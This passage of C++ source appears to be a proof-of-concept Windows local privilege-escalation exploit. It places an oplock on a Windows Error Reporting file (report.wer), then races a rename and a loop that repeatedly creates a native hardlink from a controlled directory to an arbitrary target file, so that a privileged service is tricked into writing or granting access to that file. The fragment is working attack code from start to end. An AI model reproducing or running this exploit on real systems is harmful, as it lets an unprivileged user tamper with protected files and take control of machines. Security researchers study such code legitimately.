#include <iostream>
#include "stdafx.h"
#include <stdio.h>
#include <tchar.h>
#include <Windows.h>
#include <strsafe.h>
#include "FileOplock.h"
#include "ReparsePoint.h"
#include <random>
const char* targetfile;
bool CreateNativeHardlink(LPCWSTR linkname, LPCWSTR targetname);
bool triggered = false;
int random = 0;
bool secondthread = false;
int fileappend = 9999;

wchar_t* target_file = nullptr;

void UnlockFile()
{
	triggered = true;
}
DWORD WINAPI MyThreadFunction2(LPVOID lpParam)
{
	std::wstring path3 = L"c:\\halb\\7_7_7_7_7\\icles";
	path3 += std::to_wstring(fileappend);
	const wchar_t* blah = path3.c_str();
	bool test = false;
	do {
		test = CreateNativeHardlink(blah, target_file);
	} while (test == false);
	return 0;
}
DWORD WINAPI MyThreadFunction(LPVOID lpParam)
{
	const wchar_t* werFilename = L"c:\\halb\\7_7_7_7_7\\report.wer";
	FileOpLock::CreateLock(werFilename, UnlockFile);
	secondthread = true;
	std::wstring path2 = L"c:\\halb\\8_8_8_8_8\\icles";
	path2 += std::to_wstring(fileappend);
	const wchar_t* destFilename = path2.c_str();
	std::wstring path = L"c:\\halb\\7_7_7_7_7\\icles";
	path += std::to_wstring(fileappend);
	const wchar_t* blah = path.c_str();
	auto destFilenameLength = wcslen(destFilename);
	auto bufferSize = sizeof(FILE_RENAME_INFO) + (destFilenameLength * sizeof(wchar_t));
	auto buffer = _alloca(bufferSize);
	memset(buffer, 0, bufferSize);
	auto const fri = reinterpret_cast<FILE_RENAME_INFO*>(buffer);
	fri->ReplaceIfExists = TRUE;
	fri->FileNameLength = destFilenameLength;
	wmemcpy(fri->FileName, destFilename, destFilenameLength);
	LARGE_INTEGER li;
	HANDLE fileHandle = CreateFile(blah, GENERIC_READ | GENERIC_WRITE | DELETE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	while (triggered == false)
	{
		QueryPerformanceCounter(&li);
	}
	int count = 0;
	while (count < random)
	{
		count++;
		QueryPerformanceCounter(&li);
	}
	SetFileInformationByHandle(fileHandle, FileRenameInfo, fri, bufferSize);
	CloseHandle(fileHandle);
	return 0;
}
